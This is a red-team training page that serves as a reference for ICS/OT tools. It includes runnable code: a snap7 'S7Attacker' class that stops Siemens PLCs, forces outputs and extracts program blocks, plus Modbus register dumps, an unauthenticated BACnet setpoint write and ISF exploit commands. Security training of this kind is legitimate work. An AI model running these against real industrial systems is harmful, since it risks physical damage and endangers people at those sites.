---
layout: training-page
title: "ICS/OT Red Team Tool Reference — Red Team Academy"
module: "OT/ICS Security"
tags:
  - ics-tools
  - scada-tools
  - ot-security
  - tool-reference
page_key: "ot-ics-ics-tools"
render_with_liquid: false
---

# ICS/OT Red Team Tool Reference

This module provides a comprehensive reference for tools used in ICS/OT security assessments. Tools are organized by category with installation instructions, usage examples, and specific ICS applicability.

---

## Nmap with ICS Protocol NSE Scripts

The most foundational tool for ICS discovery. Critical: use `-T2` (polite timing) to avoid crashing embedded controllers.

```bash
# Install Nmap (most distros)
sudo apt install nmap

# ICS-specific NSE scripts (built into Nmap):
# s7-info.nse      - Siemens S7 enumeration
# modbus-discover  - Modbus device discovery
# enip-info        - EtherNet/IP/CIP enumeration
# dnp3-info        - DNP3 enumeration
# bacnet-info      - BACnet building automation
# pcworx-info      - Phoenix Contact PCWorx

# Comprehensive ICS scan (polite timing, never use T4/T5 on OT)
nmap -T2 -sV \
  -p 102,502,20000,44818,2222,4840,47808,1911,9600,18245 \
  --script=s7-info,modbus-discover,enip-info,dnp3-info,bacnet-info,pcworx-info \
  --script-args=unsafe=0 \
  <ot_subnet>

# Quick ICS protocol port scan only
nmap -T2 -p 102,502,20000,44818,47808,4840 --open <subnet>/24

# Individual protocol scans:

# Siemens S7
nmap -T2 -p 102 --script=s7-info <target>

# Modbus TCP
nmap -T2 -p 502 --script=modbus-discover <target>

# EtherNet/IP (Allen-Bradley)
nmap -T2 -p 44818 --script=enip-info <target>

# BACnet (building automation — air handling, elevators, fire systems)
nmap -T2 -sU -p 47808 --script=bacnet-info <target>

# OPC-UA
nmap -T2 -p 4840 --script=opcua-info <target>

# Tridium Niagara Fox
nmap -T2 -p 1911,4911 --script=fox-info <target>
```

---

## Redpoint (Digital Bond NSE Scripts)

The most complete collection of ICS-specific Nmap scripts. Digital Bond developed these for Project Basecamp (2012 research exposing PLC vulnerabilities).

```bash
# Clone Redpoint
git clone https://github.com/digitalbond/Redpoint.git
cd Redpoint

# Scripts included:
# s7-info.nse          - Siemens S7-300/400/1200/1500
# modbus-discover.nse  - Modbus device enumeration
# enip-enumerate.nse   - Allen-Bradley EtherNet/IP full enumeration
# dnp3-info.nse        - DNP3 outstation discovery
# fox-info.nse         - Tridium Niagara AX/4
# bacnet-info.nse      - BACnet/IP devices
# omron-info.nse       - Omron FINS protocol
# pcworx-info.nse      - Phoenix Contact ILC PLCs
# proconos-info.nse    - Procono SCADA
# codesys-v2-info.nse  - CODESYS v2 PLCs (many vendors)
# moxa-discover.nse    - Moxa serial servers

# Siemens S7 deep enumeration
nmap -p 102 --script=./Redpoint/s7-info.nse \
  --script-args=s7-info.timeout=2 <target>
# Returns: module type, serial number, plant ID, firmware version

# Allen-Bradley CIP full enumerate
nmap -p 44818 --script=./Redpoint/enip-enumerate.nse <target>
# Returns: vendor, product code, serial number, revision, IP, hostname

# Tridium Niagara (building automation platform)
nmap -p 1911 --script=./Redpoint/fox-info.nse <target>
# Returns: station name, OS version, Java version, time zone

# BACnet
nmap -sU -p 47808 --script=./Redpoint/bacnet-info.nse <target>
# Returns: vendor, model, firmware, object list

# CODESYS (used by: Wago, 3S, Beckhoff, many others)
nmap -p 1200,2455 --script=./Redpoint/codesys-v2-info.nse <target>
```

---

## PLCScan

Dedicated scanner for Siemens S7 and Modbus TCP devices.

```bash
# Clone PLCScan
git clone https://github.com/yanlinlin82/plcscan.git
cd plcscan
pip install -r requirements.txt

# Scan for S7 PLCs
python plcscan.py 192.168.1.0/24 -p 102

# Scan for Modbus
python plcscan.py 192.168.1.0/24 -p 502

# Single target, both protocols
python plcscan.py 192.168.1.100 -p 102,502

# Output example:
# 192.168.1.100:102 - S7 PLC: Siemens S7-300 CPU 315-2 PN/DP
#   Module Type: CPU 315-2 PN/DP
#   Serial Number: S C-X4U518471M
#   Plant ID: PLANT_A
#   Firmware: 3.3.5.1
```

### s7scan — Alternative S7 Scanner

```bash
git clone https://github.com/klsecservices/s7scan
cd s7scan
python s7scan.py -i 192.168.1.0/24

# s7scan attempts to read:
# - Module identification
# - CPU state (RUN/STOP/HALT)
# - Protection level (0=no protection, 3=full)
# - Order number (exact hardware model)
```

---

## snap7 — Python S7 Communication Library

snap7 is a C library with Python bindings for direct S7 PLC communication (read/write without needing Siemens STEP 7 software).

```bash
# Install snap7
pip install python-snap7

# Ubuntu: may need libsnap7
sudo apt install libsnap7-1 libsnap7-dev
```

```python
#!/usr/bin/env python3
# snap7_operations.py — Complete S7 PLC operations
import snap7
from snap7 import Area, Block
import struct

class S7Attacker:
    def __init__(self, ip, rack=0, slot=2):
        self.client = snap7.client.Client()
        self.client.connect(ip, rack, slot)
        print(f"[+] Connected to S7 PLC at {ip}")
    
    def get_cpu_info(self):
        """Read CPU identification"""
        info = self.client.get_cpu_info()
        return {
            'module_type': info.ModuleTypeName.decode().strip(),
            'serial': info.SerialNumber.decode().strip(),
            'as_name': info.ASName.decode().strip(),
            'module_name': info.ModuleName.decode().strip()
        }
    
    def get_cpu_state(self):
        """Get PLC operating state"""
        state = self.client.get_cpu_state()
        states = {0: 'UNKNOWN', 4: 'STOP', 8: 'RUN'}
        return states.get(state, f'UNKNOWN({state})')
    
    def read_db(self, db_number, start=0, size=100):
        """Read Data Block contents"""
        return self.client.db_read(db_number, start, size)
    
    def write_db_word(self, db_number, offset, value):
        """Write a 16-bit word to a Data Block"""
        data = struct.pack('>H', value)  # Big-endian (S7 format)
        self.client.db_write(db_number, offset, data)
    
    def write_db_real(self, db_number, offset, value):
        """Write a 32-bit float (REAL) to a Data Block"""
        data = struct.pack('>f', value)
        self.client.db_write(db_number, offset, data)
    
    def read_outputs(self):
        """Read PLC output image (physical outputs)"""
        return self.client.read_area(Area.PA, 0, 0, 16)  # 16 bytes of outputs
    
    def write_output_bit(self, byte_offset, bit_offset, value):
        """Force a physical output bit"""
        current = bytearray(self.client.read_area(Area.PA, 0, byte_offset, 1))
        if value:
            current[0] |= (1 << bit_offset)
        else:
            current[0] &= ~(1 << bit_offset)
        self.client.write_area(Area.PA, 0, byte_offset, bytes(current))
    
    def stop_plc(self):
        """Stop the PLC (puts it in STOP mode)"""
        self.client.plc_stop()
        print("[!] PLC set to STOP mode")
    
    def start_plc(self):
        """Start the PLC (puts it in RUN mode)"""
        self.client.plc_hot_start()
        print("[+] PLC set to RUN mode")
    
    def extract_program_block(self, block_type, block_num, output_file):
        """Extract a program block from the PLC"""
        data = self.client.full_upload(block_type, block_num)
        with open(output_file, 'wb') as f:
            f.write(data)
        print(f"[+] Extracted {block_type} {block_num}: {len(data)} bytes → {output_file}")
    
    def disconnect(self):
        self.client.disconnect()

# Usage example
plc = S7Attacker("192.168.1.100")
info = plc.get_cpu_info()
print(f"[+] CPU: {info['module_type']} | Serial: {info['serial']}")
print(f"[+] State: {plc.get_cpu_state()}")

# Extract all program blocks
for block_num in range(1, 10):
    try:
        plc.extract_program_block(Block.OB, block_num, f"OB{block_num}.bin")
    except:
        pass

for db_num in range(1, 50):
    try:
        plc.extract_program_block(Block.DB, db_num, f"DB{db_num}.bin")
    except:
        pass

plc.disconnect()
```

---

## pymodbus — Modbus Protocol Library

```bash
pip install pymodbus
```

```python
#!/usr/bin/env python3
# pymodbus_toolkit.py — Full Modbus attack toolkit
from pymodbus.client import ModbusTcpClient
from pymodbus.client import ModbusSerialClient

# TCP connection
client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Serial connection (via serial-to-Ethernet converter or USB-RS485)
serial_client = ModbusSerialClient(
    method='rtu',
    port='/dev/ttyUSB0',
    baudrate=9600,
    parity='N',
    stopbits=1,
    bytesize=8
)

# Full register dump
def full_modbus_dump(client, unit_id=1):
    results = {}
    
    # Coils (digital outputs) — try all 2000
    r = client.read_coils(0, 2000, slave=unit_id)
    if not r.isError():
        results['coils'] = r.bits
    
    # Discrete inputs — try all 2000
    r = client.read_discrete_inputs(0, 2000, slave=unit_id)
    if not r.isError():
        results['discrete_inputs'] = r.bits
    
    # Input registers — try 125 at a time (Modbus limit per request)
    input_regs = []
    for start in range(0, 10000, 125):
        r = client.read_input_registers(start, 125, slave=unit_id)
        if r.isError():
            break
        input_regs.extend(r.registers)
    results['input_registers'] = input_regs
    
    # Holding registers — try 125 at a time
    hold_regs = []
    for start in range(0, 10000, 125):
        r = client.read_holding_registers(start, 125, slave=unit_id)
        if r.isError():
            break
        hold_regs.extend(r.registers)
    results['holding_registers'] = hold_regs
    
    return results

dump = full_modbus_dump(client)
print(f"Coils (first 20): {dump.get('coils', [])[:20]}")
print(f"Hold Regs (first 10): {dump.get('holding_registers', [])[:10]}")

client.close()
```

---

## pycomm3 — Allen-Bradley EtherNet/IP Library

```bash
pip install pycomm3
```

```python
#!/usr/bin/env python3
# pycomm3_toolkit.py — Allen-Bradley PLC operations
from pycomm3 import LogixDriver, CIPDriver

# Connect to ControlLogix / CompactLogix
with LogixDriver('192.168.1.100') as plc:
    # Get all tags
    tags = plc.get_tag_list()
    print(f"[+] Found {len(tags)} tags")
    
    # Read specific tags
    result = plc.read('Motor_Speed', 'Pump_Status', 'Valve_Pos')
    for tag, value, dtype in result:
        print(f"  {tag} = {value} ({dtype})")
    
    # Write tags (use with caution)
    # plc.write(('Motor_Speed', 0))  # Set speed to 0
    
    # Get controller info
    info = plc.info
    print(f"\n[+] PLC Info:")
    print(f"  Vendor: {info['vendor']}")
    print(f"  Product: {info['product_name']}")
    print(f"  Revision: {info['revision']['major']}.{info['revision']['minor']}")
    print(f"  Serial: {info['serial']}")

# CIP raw access (for non-Logix CLX PLCs)
with CIPDriver('192.168.1.101') as cip:
    # Get identity object
    identity = cip.generic_message(
        class_code=0x01,
        instance=0x01,
        connected=False,
        unconnected_send=True,
        route_path=True
    )
```

---

## Smod — Modbus Fuzzer

```bash
# Clone Smod
git clone https://github.com/theralfbrown/smod-1.git
cd smod-1
pip install -r requirements.txt

# Run Smod (Metasploit-like interface for Modbus)
python smod.py

# Inside Smod:
> use modbus/scanner/discovery
> set RHOST 192.168.1.100
> run

> use modbus/function/read_coils
> set RHOST 192.168.1.100
> set UNIT 1
> set ADDRESS 0
> set COUNT 100
> run

# Fuzzing module
> use modbus/fuzzer/client
> set RHOST 192.168.1.100
> run
```

---

## Conpot — ICS Honeypot

Conpot simulates ICS devices and protocols. Useful for:
- Understanding what defenders see when ICS devices are attacked
- Testing ICS attack tools safely
- Creating deceptive environments

```bash
pip install conpot

# Start with Siemens S7-200 simulation
sudo conpot --template default -l 0.0.0.0

# Available templates:
# default (S7-200)
# guardian-ast (fuel monitoring)
# kamstrup_382 (smart meter)
# IEC 104 (power grid)
# ipmi (server IPMI interface)
# BACnet (building automation)
# hgu (home gateway)

# Custom template for target emulation:
# Copy /etc/conpot/templates/default/ to new directory
# Edit XML files to match target device characteristics
# conpot --template /etc/conpot/templates/custom_plc/ -l 0.0.0.0

# Conpot log file shows all incoming connections and queries:
tail -f /var/log/conpot/conpot.log
```

---

## GrassMarlin — Passive ICS Network Topology Mapper

GRASSMARLIN (NSA/CISA released, open source) performs passive network analysis to build a topology map of ICS networks without generating any traffic.

```bash
# Download from: https://github.com/nsacyber/GRASSMARLIN
# Requires: Java 8+, WinPcap or libpcap

# Linux setup
java -jar grassmarlin.jar

# Or capture to pcap first, then analyze offline
tcpdump -i eth0 -w ics_network.pcap
# Load pcap into GRASSMARLIN

# GRASSMARLIN identifies:
# - ICS protocol communications (Modbus, DNP3, EtherNet/IP, S7comm)
# - Communication relationships between devices
# - Device roles (master/slave, client/server)
# - Produces network diagram showing all ICS asset relationships
# - No active probing — purely passive analysis
```

---

## ISF — Industrial Exploitation Framework

ISF (Industrial Security Framework) is a Metasploit-like framework specifically for ICS protocols.

```bash
# Clone ISF
git clone https://github.com/dark-lbp/isf.git
cd isf
pip install -r requirements.txt

python isf.py

# Available modules:
# exploits/plcs/siemens/         - Siemens S7 exploits
# exploits/plcs/allen_bradley/   - Rockwell exploits
# exploits/plcs/schneider/       - Schneider exploits
# exploits/scada/                - SCADA application exploits
# scanners/                      - ICS protocol scanners

# Example: Siemens S7 scanner
isf > use scanners/plcs/siemens_s7_300_400_scanner
isf > set RHOSTS 192.168.1.0/24
isf > run

# Schneider Modicon password disclosure
isf > use exploits/plcs/schneider/schneider_password_leak
isf > set RHOST 192.168.1.100
isf > run
```

---

## Scapy with ICS Protocol Dissectors

Scapy supports ICS protocols for crafting and analyzing packets.

```bash
pip install scapy
# Additional ICS dissectors:
pip install scapy-ics  # If available, or use scapy-contrib
```

```python
#!/usr/bin/env python3
# scapy_ics.py — ICS packet crafting with Scapy
from scapy.all import *
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest

# Modbus TCP packet crafting with Scapy
def craft_modbus_read(dst_ip, unit_id=1, start_addr=0, count=10):
    """Craft a Modbus Read Holding Registers request"""
    pkt = IP(dst=dst_ip) / TCP(dport=502) / \
          ModbusADURequest(transId=1, protoId=0, unitId=unit_id) / \
          ModbusPDU03ReadHoldingRegistersRequest(
              referenceNumber=start_addr,
              quantityOfRegisters=count
          )
    resp = sr1(pkt, timeout=3, verbose=0)
    if resp:
        return resp
    return None

# Scapy ICS dissection from pcap
packets = rdpcap('industrial_traffic.pcap')
for pkt in packets:
    if TCP in pkt and pkt[TCP].dport == 502:
        pkt.show()  # Show Modbus dissection

# Custom DNP3 packet crafting
def craft_dnp3_raw(src_ip, dst_ip, dnp3_payload):
    """Send raw DNP3 bytes"""
    pkt = IP(src=src_ip, dst=dst_ip) / TCP(dport=20000) / Raw(load=dnp3_payload)
    send(pkt, verbose=0)

# BACnet discovery (broadcast)
def bacnet_who_is():
    """BACnet Who-Is broadcast — discovers all BACnet devices"""
    # BACnet/IP runs on UDP 47808
    # Who-Is is the device discovery message
    whois = bytes([
        0x81, 0x0B,  # BVLL: BACnet/IP + Original-Broadcast-NPDU
        0x00, 0x0C,  # Length: 12 bytes
        0x01, 0x20,  # NPDU: version 1, destination broadcast
        0xFF, 0xFF,  # Destination network: 0xFFFF (global broadcast)
        0x00,        # Destination MAC: 0 length (broadcast)
        0xFF,        # Hop count: 255
        0x10, 0x08,  # APDU: unconfirmed service, Who-Is
    ])
    pkt = IP(dst="255.255.255.255") / UDP(dport=47808) / Raw(load=whois)
    answered = srp(pkt, timeout=5, verbose=0)
    return answered
```

---

## BACnet Discovery Tools

BACnet controls building automation systems — HVAC, elevators, fire suppression, access control. Often overlooked in OT assessments.

```bash
# BACnet Explorer (Windows GUI)
# Download: https://sourceforge.net/projects/bacnet/

# bacnet-stack — open source BACnet library with command-line tools
git clone https://github.com/bacnet-stack/bacnet-stack.git
cd bacnet-stack
make

# Who-Is discovery (enumerate all BACnet devices on network)
./bin/bacwi -d 0 -i eth0
# Returns: device IDs, IP addresses, instance numbers

# Read property from a BACnet device
./bin/bacrp -d 100 -i eth0 8 0 77
# -d 100: Destination device instance
# 8 0: Object type 8 (Device), instance 0
# 77: Property ID 77 (Object Name)

# Read analog value (sensor data)
./bin/bacrp -d 100 -i eth0 2 1 85
# 2 1: Analog Value object, instance 1
# 85: Present Value property

# Write analog output (control action — NO AUTH REQUIRED)
./bin/bacwp -d 100 -i eth0 1 0 85 -m 16 -1 r 72.5
# Object: Analog Output, instance 0
# Property: Present Value
# Value: 72.5 (e.g., set temperature setpoint to 72.5°F)
```

---

## ModbusPal — Modbus Simulator

```bash
# Download ModbusPal: https://sourceforge.net/projects/modbuspal/
# Requires Java 8+
java -jar ModbusPal.jar

# ModbusPal features:
# 1. Modbus slave simulator: create virtual PLCs with configurable registers
# 2. Modbus master: read/write to real PLCs via GUI
# 3. Value generators: simulate changing process values (ramps, noise, sine)
# 4. Scripting: Jython scripts for complex simulation behavior
# 5. Linkage: connect register values to UI elements

# Uses:
# - Test attack tools safely against simulated PLC
# - Understand what defenders see during Modbus attacks
# - Simulate target environment before live engagement
```

---

## MITRE ATT&CK for ICS Quick Reference

### Critical Techniques by Tactic

| Tactic | Technique ID | Name | Tool Example |
|--------|-------------|------|-------------|
| Initial Access | T0817 | Drive-by Compromise | Browser exploit targeting ICS engineer |
| Initial Access | T0819 | Exploit Public-Facing Application | Shodan→exposed HMI→exploit |
| Initial Access | T0866 | Exploitation of Remote Services | VPN/RDP exploitation |
| Initial Access | T0865 | Spearphishing Attachment | Malicious STEP 7 project file |
| Execution | T0807 | Command-Line Interface | PowerShell on EWS |
| Execution | T0821 | Modify Controller Tasking | snap7 program upload |
| Persistence | T0839 | Module Firmware | Malicious PLC firmware via TFTP |
| Persistence | T0873 | Project File Infection | Backdoored HMI project |
| Discovery | T0840 | Network Connection Enumeration | Redpoint NSE scripts |
| Discovery | T0888 | Remote System Information Discovery | PLCScan, s7scan |
| Lateral Movement | T0812 | Default Credentials | admin:admin on HMI |
| Lateral Movement | T0859 | Valid Accounts | Stolen historian service account |
| Collection | T0802 | Automated Collection | PI Web API bulk export script |
| Collection | T0811 | Data from Information Repositories | PI historian data extraction |
| Impair Response | T0800 | Activate Firmware Update Mode | Force PLC into update mode |
| Impair Response | T0803 | Block Command Message | Drop DNP3 control packets |
| Process Control | T0836 | Modify Parameter | Modbus FC06 register write |
| Process Control | T0855 | Unauthorized Command Message | DNP3 Direct Operate |
| Process Control | T0856 | Spoof Reporting Message | Fake DNP3 unsolicited response |
| Impact | T0826 | Loss of Availability | PLC STOP via snap7 |
| Impact | T0831 | Manipulation of Control | Coil force via Modbus |
| Impact | T0828 | Loss of Productivity and Revenue | Process disruption |
| Impact | T0829 | Loss of Protection | Disable safety instrumented system |

### Real-World Malware to MITRE Mapping

| Malware | Actor | Key ICS Techniques |
|---------|-------|-------------------|
| Stuxnet | USA/Israel | T0821, T0833, T0856 |
| Industroyer/Crashoverride | Sandworm | T0855, T0803, T0800, T0831 |
| TRITON/TRISIS | XENOTIME | T0800, T0858, T0829 |
| BlackEnergy | Sandworm | T0836, T0817 |
| Industroyer2 | Sandworm | T0855 (IEC 104 direct operate) |

---

## Tool Comparison Matrix

| Tool | Protocols | Passive/Active | OS | Best For |
|------|-----------|---------------|----|---------|
| Nmap + ICS NSE | Multi-protocol | Active | Linux/Win | Initial discovery |
| Redpoint | Modbus,DNP3,EnIP,BACnet,S7 | Active | Linux | Deep enumeration |
| PLCScan | S7, Modbus | Active | Linux | S7 network mapping |
| snap7 | S7comm | Active | Linux/Win/Mac | S7 read/write/control |
| pymodbus | Modbus TCP/RTU | Active | Linux/Win | Modbus exploitation |
| pycomm3 | EtherNet/IP CIP | Active | Linux/Win | Allen-Bradley ops |
| GRASSMARLIN | Multi-protocol | Passive | Linux/Win | Network topology |
| Conpot | S7, Modbus, BACnet | Passive (honeypot) | Linux | Lab simulation |
| ISF | Multi-protocol | Active | Linux | Exploitation framework |
| Smod | Modbus | Active (fuzzer) | Linux | Modbus fuzzing |
| bacnet-stack | BACnet | Active | Linux/Win | Building automation |
| Scapy | Custom/any | Active | Linux | Packet crafting |

---

## Installation Quick Reference

```bash
# Install all major ICS tools on Kali/Ubuntu:

# Nmap (built-in on Kali)
sudo apt install nmap

# Python libraries
pip install pymodbus snap7 python-snap7 pycomm3 opcua scapy

# Redpoint NSE scripts
git clone https://github.com/digitalbond/Redpoint.git

# PLCScan
git clone https://github.com/yanlinlin82/plcscan.git

# ISF
git clone https://github.com/dark-lbp/isf.git && pip install -r isf/requirements.txt

# Conpot
pip install conpot

# BACnet stack
git clone https://github.com/bacnet-stack/bacnet-stack.git && cd bacnet-stack && make

# Zeek with ICS analyzers (passive monitoring)
sudo apt install zeek
sudo zeek-pkg install corelight/zeek-spicy-ics

# Metasploit (built-in on Kali, has SCADA modules)
msfdb init && msfconsole

# boofuzz for fuzzing
pip install boofuzz
```

---

*This completes the ICS/OT Red Team module series. Return to the [Overview](overview.md) for the methodology summary.*
